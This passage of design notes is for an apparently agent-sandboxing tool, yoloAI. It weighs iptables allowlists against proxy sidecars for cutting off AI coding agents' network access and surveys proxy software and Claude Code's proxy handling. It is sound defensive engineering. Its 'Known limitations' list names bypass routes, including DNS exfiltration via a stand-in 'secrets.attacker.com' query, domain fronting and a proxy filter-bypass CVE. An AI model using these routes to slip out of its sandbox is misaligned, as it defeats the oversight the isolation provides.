**Source:** [Docker Docs — Docker with iptables](https://docs.docker.com/engine/network/firewall-iptables/), [Docker Docs — Docker with nftables](https://docs.docker.com/engine/network/firewall-nftables)

#### Is iptables more robust than a proxy?

Yes, for the raw-TCP-bypass vector. iptables operates at the kernel level on all packets, regardless of whether the application respects proxy environment variables. A process cannot bypass iptables rules in its network namespace without `CAP_NET_ADMIN` (which the sandbox should not grant to application processes).

However, iptables has its own limitations:
- Works on IPs, not domains. Domains must be resolved to IPs at setup time, which means CDN IP rotation can make rules stale.
- DNS exfiltration is still possible if UDP 53 is allowed outbound (which it must be if the container needs DNS resolution).
- Requires `CAP_NET_ADMIN` if rules are applied inside the container (the Anthropic/Trail of Bits approach).

#### Cross-platform viability

| Platform | iptables/nftables support | Notes |
|---|---|---|
| **Linux native** | Full support | iptables rules in host namespace (DOCKER-USER chain) or container namespace (CAP_NET_ADMIN). nftables experimental in Docker 29+. |
| **macOS (Docker Desktop)** | Works inside the LinuxKit VM | Docker Desktop runs containers in a LinuxKit VM. iptables rules work **inside the VM** (including inside containers). The macOS host has no iptables — it uses `pf` (packet filter). Host-side `DOCKER-USER` rules are not accessible from macOS; you must either apply rules inside the container or access the VM via `nsenter`. |
| **WSL2 (Windows)** | Works inside the WSL2 VM | Similar to macOS: containers run in a Linux VM. iptables works inside the VM and containers. |

**Source:** [Collabnix — Under the Hood: Docker Desktop for Mac](https://collabnix.com/how-docker-for-mac-works-under-the-hood/), [Docker Community Forums — iptable manipulation in Docker for Mac](https://forums.docker.com/t/iptable-manipulation-in-docker-for-mac/48193)

**Key insight for yoloAI:** Because Docker on macOS and Windows always runs in a Linux VM, iptables inside the container works on all platforms. The `CAP_NET_ADMIN` approach (rules inside the container) is the most portable. Host-level `DOCKER-USER` rules only work reliably on native Linux.

### 5. Existing Open-Source Implementations

| Tool | Approach | Verified working? |
|---|---|---|
| **Anthropic sandbox-runtime** | Network namespace removal + dual proxy (HTTP + SOCKS5) via Unix domain sockets | Yes — production use for Claude Code |
| **Docker Sandboxes** | MicroVM + filtering proxy, raw TCP/UDP blocked at VM boundary | Yes — Docker Desktop 4.58+ |
| **Claude Code devcontainer** | iptables + ipset inside container (CAP_NET_ADMIN) | Yes — used by Anthropic's own development |
| **Trail of Bits devcontainer** | iptables + ipset inside container (CAP_NET_ADMIN + CAP_NET_RAW) | Yes — used for security audits |
| **jpetazzo/squid-in-a-can** | Transparent Squid proxy with iptables REDIRECT | Yes — but HTTP-only, no HTTPS inspection |
| **Google Agent Sandbox** | Kubernetes controller with gVisor isolation | Yes — GKE production, open source |
| **SequentialRead firewall** | Docker Compose internal network + nginx proxy per domain | Yes — documented with examples |

### 6. Design Approach for yoloAI

#### Adopted approach: iptables + ipset inside the container

Follows the same pattern as Anthropic's Claude Code devcontainer and Trail of Bits' devcontainer — both verified production implementations. Single container, no sidecar, simple to implement and debug.

**How it works:**

1. The entrypoint resolves allowlisted domains to IPs via `dig` and populates an ipset (`hash:net`).
2. Default-deny iptables policy: DROP all OUTPUT except established connections, DNS (UDP 53 to Docker's internal resolver at 127.0.0.11), and traffic to IPs in the allowlist ipset.
3. Explicitly REJECT (not DROP) unmatched outbound for immediate feedback to the agent.
4. Rules are configured by the entrypoint while running as root. The entrypoint then drops privileges via `gosu` — the agent process never has `CAP_NET_ADMIN`.
5. Requires `CAP_NET_ADMIN` (a separate capability from `CAP_SYS_ADMIN` — both must be granted when using `:overlay` + `--network-isolated`; for `:copy` mode, only `CAP_NET_ADMIN` is added).

**Why this approach:**

- **Battle-tested:** Same pattern Anthropic and Trail of Bits ship. If it's good enough for Anthropic's own devcontainer, it's good enough for us.
- **Single container:** No sidecar lifecycle management, no proxy image builds, no health checks, no failure mode multiplication across every lifecycle command.
- **Cross-platform:** iptables works inside Docker's Linux VM on all platforms (Linux, macOS Docker Desktop, WSL2).
- **Covers primary threat vectors:** Blocks raw TCP bypass, non-HTTP protocols, and IP-direct connections. See the comparison table in section 3.

#### Known limitations

1. **DNS exfiltration:** UDP 53 must be allowed for domain resolution. A malicious query like `secrets.attacker.com` will be forwarded upstream. This is the same limitation shared by Anthropic's devcontainer and Trail of Bits'. Mitigated (not eliminated) in Claude Code v1.0.4 by removing networking utilities from the auto-approve allowlist.

2. **CDN IP rotation:** Domain-to-IP resolution happens at container start. If IPs change (CDN rotation), rules become stale. Restart the container to refresh. Not a practical concern for stable API endpoints like `api.anthropic.com`.

3. **Domain fronting:** iptables cannot detect SNI/Host header mismatches. Major CDNs have banned this. Acceptable risk.

4. **`CAP_NET_ADMIN`:** Required for iptables. Combined with `CAP_SYS_ADMIN` (for `:overlay` mode), the container has two broad capabilities. Users concerned about this can use `:copy` mode + no network isolation to avoid both.

#### Deferred: proxy sidecar architecture

A more robust approach using an internal Docker network + proxy sidecar container + DNS control could mitigate DNS exfiltration and handle CDN IP rotation dynamically. The research is thorough (see sections 2-5 above) and the architecture is well-understood:

```
Internal Docker Network (--internal) → Proxy Sidecar → Internet (filtered)
```

Layers: network topology (--internal) + proxy allowlist (CONNECT tunneling) + iptables (defense-in-depth) + DNS control (proxy resolves DNS, block UDP 53).

This adds significant operational complexity: sidecar lifecycle across all commands (start/stop/reset/restart/destroy), proxy image building, health checks, failure modes. The iptables-only approach covers the primary threat vectors at a fraction of the complexity. The proxy architecture remains here as a reference if stronger isolation is ever needed — but only if someone asks really nicely, with a fat wad of cash.

---

## Proxy Sidecar Research

Evaluation of forward proxy options for yoloAI's `--network-isolated` sidecar. Requirements: HTTPS CONNECT tunneling with domain allowlist (no MITM), lightweight (runs per sandbox), configurable allowlist, logging.

### Options Evaluated

| Criterion                | Tinyproxy        | Squid          | Nginx+Module   | mitmproxy  | Go Custom       |
|--------------------------|------------------|----------------|----------------|------------|-----------------|
| CONNECT domain allowlist | Yes              | Yes            | Yes (awkward)  | Partial    | Yes             |
| Image size (compressed)  | ~3 MB            | ~8-18 MB       | ~49 MB         | ~150+ MB   | ~5-10 MB        |
| Memory (idle)            | ~2-3 MB          | ~20-50 MB      | ~5-10 MB       | ~50+ MB    | ~5-10 MB        |
| Config reload            | SIGUSR1          | squid -k reconf| nginx -s reload| Script     | Full control    |
| Actively maintained      | Minimal          | Yes            | Third-party    | Yes        | Self-maintained |
| Security track record    | CVEs unfixed     | Good           | N/A            | Good       | Self-maintained |
| Implementation effort    | Config only      | Config only    | Config + build | Config     | ~200-300 lines  |

### Tinyproxy — functional but security concerns

Tinyproxy (C-based, ~3 MB image) meets core requirements. `FilterDefaultDeny Yes` + `FilterType fnmatch` + `ConnectPort 443` provides domain-based CONNECT filtering. SIGUSR1 reloads config. Maintainer confirmed domain filtering works for HTTPS CONNECT ([issue #345](https://github.com/tinyproxy/tinyproxy/issues/345)).

**Security concern:** CVE-2025-63938 (integer overflow in port parsing, allows filter bypass) is fixed in master commit `3c0fde9` (October 2025) but **no released version contains this fix**. Latest release is 1.11.2 (May 2024). Release cadence is slow — security patches sit unreleased for months. 116 open issues.

Would need to build from master, not a tagged release. The port filter bypass is partially mitigated by yoloAI's iptables rules (defense-in-depth), but relying on unreleased security fixes for a security-critical component is a risk.

### Squid — overkill

Full-featured, excellent ACL system, actively maintained. But ~20-50 MB memory baseline even with caching disabled. Designed for enterprise caching proxies, not lightweight per-sandbox sidecars. Configuration is powerful but verbose for this simple use case.

### Nginx — wrong tool

Requires third-party `ngx_http_proxy_connect_module` patch. Forward proxying is not nginx's design intent. ~49 MB image. Configuration model is unintuitive for allowlist-based forward proxying.

### mitmproxy — wrong tool, too large

~150+ MB image (Python runtime). Designed for interception and debugging, not production forward proxying. Allowlist model (`allow_hosts`) is an afterthought with reported inconsistencies.

### Custom Go proxy — chosen approach

A purpose-built Go forward proxy using `elazarl/goproxy` (6.6k stars) or `smarty/cproxy` (181 stars, designed for exactly this use case). ~200-300 lines of Go. Compiles to a static binary in a `FROM scratch` image (~5 MB).

Core pattern ([Eli Bendersky's writeup](https://eli.thegreenplace.net/2022/go-and-proxy-servers-part-2-https-proxies/)): parse CONNECT request, check domain against allowlist, `net.Dial` to target, `http.Hijacker` to get raw connection, bidirectional `io.Copy`.

Advantages:
- Integrates naturally with yoloAI's Go codebase
- Single static binary, minimal image and memory footprint
- No external CVE risk or release-cadence dependency
- Full control over allowlist format, reload (SIGUSR1), logging
- Exact feature match — no unused capabilities

### Decision

Custom Go proxy. The modest implementation cost (~200-300 lines) buys independence from tinyproxy's unfixed CVEs and slow release cadence, with equivalent size and performance.

### DNS: Separate Concern

None of the proxy options serve as a DNS resolver. The [security design](../design/security.md) specifies the sandbox uses the proxy sidecar as its DNS resolver with direct outbound DNS blocked by iptables. This requires a lightweight DNS forwarder (e.g., dnsmasq, ~500 KB) running alongside the proxy in the sidecar container. DNS-level domain filtering is not needed — iptables blocks direct DNS and all HTTP/HTTPS must go through the proxy. The DNS forwarder simply resolves queries upstream for the proxy's own outbound connections.

---

## Claude Code Proxy Support Research

Research into whether Claude Code honors HTTP_PROXY/HTTPS_PROXY environment variables. While yoloAI's current `--network-isolated` design uses iptables + ipset (no proxy), proxy support remains relevant for the deferred proxy sidecar architecture and for users behind corporate proxies.

### npm Installation (Node.js)

Claude Code's npm installation (`@anthropic-ai/claude-code`) honors `HTTP_PROXY`, `HTTPS_PROXY`, and `NO_PROXY` environment variables. It uses undici's `EnvHttpProxyAgent` with `setGlobalDispatcher()` to apply proxy settings globally to all fetch requests. This was introduced around v1.0.93 (with a regression fixed by ~v1.0.97).

The Anthropic Node.js SDK (`@anthropic-ai/sdk`) does NOT read proxy env vars automatically — it relies on the global dispatcher set by Claude Code's startup code. The SDK also supports explicit proxy configuration via `fetchOptions` with an `undici.ProxyAgent`, but this is for SDK consumers, not relevant to yoloAI (we don't modify Claude Code's source).

**Required Node.js version:** 18+ for Claude Code, 20 LTS+ for the SDK.

**Source:** [Claude Code network configuration docs](https://code.claude.com/docs/en/network-config), [anthropic-sdk-typescript](https://github.com/anthropics/anthropic-sdk-typescript)

### Native Binary Installation (Bun)

The native binary installation bundles a Bun runtime. Bun's `fetch()` does NOT honor `HTTP_PROXY`/`HTTPS_PROXY` env vars. This means the native binary cannot route API calls through a proxy. Known bug tracked in [#14165](https://github.com/anthropics/claude-code/issues/14165) and [#21298](https://github.com/anthropics/claude-code/issues/21298), still reported as of v2.1.20 (February 2026).

**Implication for yoloAI:** The base Docker image MUST install Claude Code via npm (`npm i -g @anthropic-ai/claude-code`), not the native binary. This is already the case in the current design.

### Proxy Protocol Support

- **HTTP forward proxy:** Supported (CONNECT tunneling for HTTPS).
- **SOCKS proxy:** NOT supported. Claude Code explicitly does not support SOCKS proxies.
- **MITM/TLS inspection:** Supported if the proxy CA certificate is provided via `NODE_EXTRA_CA_CERTS=/path/to/ca.pem`. No certificate pinning detected.
- **Client certificates:** Supported via `CLAUDE_CODE_CLIENT_CERT` for mTLS environments.

**Source:** [Claude Code network configuration docs](https://code.claude.com/docs/en/network-config)

### Required Domains

Based on the official Claude Code enterprise network configuration docs (March 2026):

| Domain | Purpose | Required? |
|--------|---------|-----------|
| `api.anthropic.com` | API calls | Yes |
| `claude.ai` | Authentication for claude.ai accounts | Yes (needed for OAuth token refresh) |
| `platform.claude.com` | Authentication for Anthropic Console accounts | Yes (needed for OAuth token refresh) |
| `statsig.anthropic.com` | Telemetry/feature flags | Recommended (may affect functionality) |
| `sentry.io` | Error reporting | Optional (blocking may cause non-fatal errors) |

The official docs list `api.anthropic.com`, `claude.ai`, and `platform.claude.com` as required. The auth domains are essential even for users who initially authenticate via API key if the CLI falls back to OAuth flows internally. Without them, OAuth tokens expire after ~30 minutes with no way to refresh, causing session loss. The devcontainer's `init-firewall.sh` does not include the auth domains (it assumes API key auth only), so it is not a complete reference.

**Source:** [Claude Code enterprise network config docs](https://code.claude.com/docs/en/network-config), [Claude Code devcontainer init-firewall.sh](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh)

### How Competitors Handle Proxy Routing

Neither of the two major sandbox implementations relies on `HTTP_PROXY` env vars:

- **sandbox-runtime:** Removes the network namespace entirely (Linux). Traffic flows through Unix domain sockets to host-side proxies. The application has no choice — it literally cannot create external sockets.
- **Docker Sandboxes:** VM-level proxy interception. The microVM's network stack routes through the proxy transparently. The application is unaware.

yoloAI's approach (internal Docker network + `HTTP_PROXY` env vars) is less invasive but depends on the application honoring the env vars. This works for Claude Code's npm installation. **Codex (static Rust binary) proxy support is unverified** — the binary may not honor proxy env vars, which would require relying solely on the iptables + internal network layers for enforcement with Codex.

### Design Implications for yoloAI

1. Base image must use npm installation of Claude Code (already the case).
2. Container environment must include `HTTPS_PROXY=http://<proxy-sidecar>:<port>` and `HTTP_PROXY=http://<proxy-sidecar>:<port>`.
3. Proxy sidecar must be an HTTP forward proxy (not SOCKS). Squid, tinyproxy, or a custom Go proxy all work.
4. No MITM/TLS inspection needed for domain-based allowlisting — HTTPS `CONNECT` tunneling exposes the target domain.
5. For v2 multi-agent support, proxy compatibility must be verified per agent. Agents using non-standard HTTP clients or bundled runtimes (like Bun) may not work.
